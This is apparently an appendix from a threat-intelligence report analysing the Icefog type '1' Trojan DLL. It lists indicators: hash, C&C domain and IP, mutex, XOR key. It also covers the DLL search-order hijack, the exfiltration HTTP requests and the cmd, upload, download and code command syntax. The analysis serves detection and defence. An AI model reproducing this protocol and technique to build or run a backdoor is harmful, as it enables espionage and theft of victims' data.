@@ -1,0 +1,169 @@
+► APPENDIX B
+MALWARE TECHNICAL ANALYSIS
+ICEFOG TYPE “1” DESCRIPTION
+|MD5|SIZE|COMPILEDON|
+|---|---|---|
+|BF13CCB777F7175ECD567E757ABCB0E4|79’248|2013-06-19 12:43:17|
+SUMMARY
+The module is a non-packed Win32 PE DLL file compiled in Microsoft Visual C++ 8.0. The module
+installs at %WinDir%\wdmaud.drv and is automatically loaded by explorer.exe on startup. This
+technique is known as “DLL search order hijacking”, and abuses the fact that Windows Explorer will
+load this file from its own directory first, instead of the Windows SYSTEM folder.
+It communicates with the C&C server at ‘icefog.8.100911.com’ (211.42.249.39) and passes
+collected information about victim, lets the operator download or upload files to and from the victim
+machines, execute system commands on the infected machines as well as execute additional
+malware components.
+DETAILED DESCRIPTION
+After the DLL is loaded, it creates system mutex named “myhorse_macfee”. If such mutex already
+exists, the module quits to avoid duplicate instances from running.
+After that, it loads %WinDir%\wdmaud.drv (this DRV is loaded by explorer.exe on startup) and
+calls exported mymainfunc of its own module that creates a new thread responsible for the
+communication with C&C.
+The spawned thread collects information about the system such as user names, machine names,
+IP addresses, running processes, proxy settings, Windows versions, etc. It produces a report that
+54
+Appendix B
+is later submitted to the C&C server. An example for such a report is shown below:
+Hostname: 
+IP: 
+Proxy: 
+User: 
+SystemDir: C:\WINDOWS\system32
+OS Language Version: 
+System Version: 
+Process:
+ID: 4 (?)
+ID: 552 (\SystemRoot\System32\smss.exe)
+...
+(List all running processes and their main executable file path)
+This information is then written to the file at %TMP%\tmp.dat.
+Then, it checks if the %TMP%\msuc.dat file exists. If it exists, the module creates a new thread
+that will load the file contents into memory and pass execution flow to the first byte of the loaded
+data in memory.
+The contents of the tmp.dat is converted to wide char and XORed with key “*&~^%@0hh8979”.
+Immediately after, it is sent via HTTP/1.1 POST request to ‘icefog.8.100911.com’ on port 80.
+The full query string is the following:
+‘/news/upload.aspx?filepath=info&filename=_.jpg’.
+Full HTTP headers:
+Host: icefog.8.100911.com
+User-Agent: MyAgent
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, /
+Accept-Language: en-us
+Content-Type: multipart/form-data’
+Accept-Encoding: gzip, deflate
+55
+APPENDIX B
+Connection: Keep-Alive
+Cache-Control: no-cache
+CONTROL COMMANDS
+The module attempts to get ‘icefog.8.100911.com/news/order/_.jpg’
+file with custom user agent “mydownload”. The response is saved to file %TMP% \order.dat
+The content of order.dat is converted from widechar to multibyte string and is parsed for the following
+command strings:
+
+
+cmd_
+
+
+upload_
+
+
+download_
+
+
+code_
+
+
+If any of the commands above is found, the Trojan notifies the C&C that the command was received
+by issuing the following POST request:
+Query string: ‘/news/upload.
+aspx? filepath=order&filename=_.jpg ’
+Full HTTP/1.1 headers:
+Host: icefog.8.100911.com
+User agent: MyAgent
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, /
+Accept-Language: en-us
+Content-Type: multipart/form-data
+Accept-Encoding: gzip, deflate
+Connection: Keep-Alive
+Cache-Control: no-cache
+56
+Appendix B
+COMMAND CMD_
+The cmd command expect a payload string () following the “cmd_” prefix, so that the
+full command syntax looks like this: cmd_. It creates a new process with command
+line C:\windows\system32\cmd.exe /c 
+However, if  contains output redirection character “>”, the executed command line
+will be as following:
+C:\windows\system32\cmd.exe /c command > %TMP%\ cmd1.dat.
+After the process has finished its stdout output is sent to the C&C via
+POST request to ‘/news/upload.
+aspx? filepath=result&filename=_.jpg ’
+Host: icefog.8.100911.com
+User-Agent: MyAgent
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, /
+Accept-Language: en-us
+Content-Type: multipart/form-data
+Accept-Encoding: gzip, deflate
+Connection: Keep-Alive
+Cache-Control: no-cache
+The command-line output is converted to wide-char string and XORed using “*&~^%@0hh8979”
+string as the key.
+COMMAND UPLOAD_
+The command string format must be as following: upload__
+It attempts to fetch icefog.8.100911.com/news/order/ using user agent mydownload
+and saves the response to the local path specified in .
+57
+APPENDIX B
+After that it notifies the C&C by sending
+HTTP/1.1 POST request
+Query string: /news/upload.aspx?filepath=upload&filename=
+Full HTTP/1.1 headers:
+Host: icefog.8.100911.com
+User-Agent: MyAgent
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, /
+Accept-Language: en-us
+Content-Type: multipart/form-data’
+Accept-Encoding: gzip, deflate
+Connection: Keep-Alive’
+Cache-Control: no-cache
+COMMAND DOWNLOAD_
+Download command format must be
+“download_\/
+The \ file is opened and its content is prepared for uploading by
+converting ANSI data to Unicode and XORing using key “*&~^%@0hh8979”. The result is saved to
+%TMP%\tmpxor.dat’
+The tmpxor.dat is uploaded via POST request to ‘icefog.8.100911.com’ at port 80.
+Query string: ‘/news/upload.aspx?filepath=download&filename=_
+.jpg’.
+Full HTTP/1.1 headers:
+Host: icefog.8.100911.com
+User-Agent: MyAgent
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, /
+Accept-Language: en-us
+Content-Type: multipart/form-data’
+58
+Appendix B
+Accept-Encoding: gzip, deflate
+Connection: Keep-Alive
+Cache-Control: no-cache
+COMMAND CODE_
+The code command format must be code_
+A new thread is created that loads a local file, specified in , to memory and passes
+the execution to the first byte of the loaded data.
+NO COMMAND
+If no known command is parsed out of the server response, the Trojan notifies the server about
+being alive by issuing the following HTTP POST request:
+Query string: ‘/news/upload.
+aspx? filepath=ok&filename=_.jpg’
+Host: icefog.8.100911.com
+User-Agent: MyAgent
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, /
+Accept-Language: en-us
+Content-Type: multipart/form-data
+Accept-Encoding: gzip, deflate
+Connection: Keep-Alive
+Cache-Control: no-cache.
+After that it sleeps for 150 seconds and starts the command-processing loop again.
+59
+APPENDIX C
